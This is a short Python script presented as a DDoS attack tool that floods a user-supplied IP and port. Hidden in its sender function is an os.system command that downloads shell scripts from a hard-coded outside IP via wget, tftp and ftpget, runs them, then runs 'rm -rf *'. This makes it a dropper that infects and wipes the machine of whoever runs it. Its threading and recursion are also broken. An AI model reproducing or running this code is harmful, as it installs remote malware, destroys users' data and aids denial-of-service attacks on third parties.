import os
import socket
import threading
import time
input("Welcome to FLUFFY CAT DDOS ATTACK")
ip = input("Enter the ip to ddos: ")
port = int(input("Enter a port: "))
threads = int(input("Enter threads: "))

def sender():
  sock = socket.socket()
  sock.connect((ip, port))
  os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.201.32.187/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 195.201.32.187 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 195.201.32.187; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 195.201.32.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
  sock.sendall(b"SYN=0")
  sock.close()
  sender()

q = []
for i in range(threads):
  t = threading.Thread(target=sender())
  t.daemon = True
  q.append(t)
for i in range(threads):
  q[i].start()
for i in range(threads): 
  q[i].join()
